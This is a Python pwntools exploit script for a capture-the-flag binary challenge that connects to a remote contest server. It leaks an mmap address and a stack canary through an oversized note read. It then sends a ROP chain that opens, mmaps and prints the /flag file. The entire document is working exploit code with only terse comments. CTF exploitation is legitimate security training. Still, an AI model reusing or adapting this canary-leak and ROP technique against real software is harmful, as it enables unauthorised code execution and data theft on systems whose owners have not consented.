from pwn import *
#io = process("./chall")
io = remote("win.the.seetf.sg",2000)

def createNote():
    io.sendlineafter("> ","1")
    io.recvuntil("is ")
    return int(io.recv(14),16)

def write(idx,size,inp):
    io.sendlineafter("> ","2")
    io.sendlineafter("idx =",str(idx))
    io.sendlineafter("size to write =",str(size))
    io.sendline(inp)

def read(idx):
    io.sendlineafter("> ","3")
    io.sendlineafter("idx =",str(idx))
    return io.recvuntil("1.")[:-3]


for i in range(3):
    # locally, mmap chunk idx 27 is the one which is above libc base
    # but remotely, mmap chunk idx 3 is the one which is above libc base
    # just look at when the addresses suddenly become much smaller to figure out which idx
    # and look at the read contents to make sure / compare the read contents of working local 
    # exploit (local idx 27) and read contents of remote

    print(i,hex(createNote()))

# the region above the libc base
addr = createNote()
log.info("mmap addr: " + hex(addr))

write(3,10,"/flag\x00")

# leak canary
canaryAddr = addr+6000

io.sendlineafter(">","2")
io.sendlineafter("idx =","3")
io.sendlineafter("size to write =","6024")

print(read(3))
canary = u64(read(3)[-31:-23])
log.info("canary: " + hex(canary))

# buffer overflow rop
popRdi = p64(0x40148f)
popRsi = p64(0x401493)
popRdx = p64(0x401495)
popR10 = p64(0x401497)
popR8  = p64(0x40149a)
popR9  = p64(0x40149d)

popRax = p64(0x401491)
syscall = p64(0x4014a8)

rop  = b"A"*24
rop += p64(canary)
rop += b"A"*8

# remembered seeing somewhere abt "memory mapping a file" just now
# so googled it and found out you can mmap a file instead of using the traditional read/write
# so like, you can copy the file contents into the memory of the process
# https://w3.cs.jmu.edu/kirkpams/OpenCSF/Books/csf/html/MMap.html

flagAddr = 0x13370000

rop += popRdi + p64(addr) + popRsi + p64(0) + popRax + p64(2) + syscall # open
rop += popRdi + p64(flagAddr) + popRsi + p64(0x1000) + popRdx + p64(7) # mmap the file
rop += popR10 + p64(0x2) + popR8 + p64(3) + popR9 + p64(0) + popRax + p64(9) + syscall
rop += popRdi + p64(1) + popRsi + p64(flagAddr) + popRdx + p64(0x100) + popRax + p64(1) + syscall # write

#gdb.attach(io,gdbscript="break *0x401959")
io.sendlineafter(">",rop)
io.sendlineafter(">","4")

io.interactive()
